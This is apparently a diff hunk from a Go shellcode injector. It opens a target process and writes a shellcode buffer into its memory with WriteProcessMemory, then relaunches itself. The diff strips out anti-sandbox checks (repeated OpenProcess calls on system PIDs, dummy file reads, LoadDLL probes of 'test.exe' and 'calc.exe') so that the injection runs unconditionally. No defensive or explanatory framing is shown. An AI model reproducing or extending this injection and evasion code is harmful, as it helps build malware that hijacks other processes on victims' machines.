@@ -172,26 +172,9 @@ func main(){
 
 			pHndl,_,_,_ := NtOpenP(NtOpenProcess,uintptr(pid))
 
-			var buf []byte
-			var done uint32
-			hndl,_ := syscall.GetCurrentProcess()
-			if _,e := windows.OpenProcess(uint32(0x1fffff),false,4);e != nil {
-				for i := 0; i < 1000; i++ {
-					windows.OpenProcess(uint32(0x1fffff),false,2)
-					//time.Sleep(1)
-					syscall.GetLastError()
-					syscall.ReadFile(hndl,buf,&done,nil)
-					syscall.LoadDLL("test.exe")
-				}
-			}
-
 			//NtWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")
 
-			if _,e := syscall.LoadDLL("calc.exe");e == nil {
-				//NtWriteVirtualMemory.Call(uintptr(pHndl),codeEntry,uintptr(unsafe.Pointer(&shellcode[0])),uintptr(len(shellcode)),0)
-				write(WriteProcessMemory,pHndl,codeEntry,shellcode)
-				//WriteProcessMemory.Call(uintptr(pHndl), codeEntry, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),0)
-			}
+			write(WriteProcessMemory,pHndl,codeEntry,shellcode)
 
 			e := exec.Command(os.Args[0], os.Args[3])
 			fmt.Println(e)
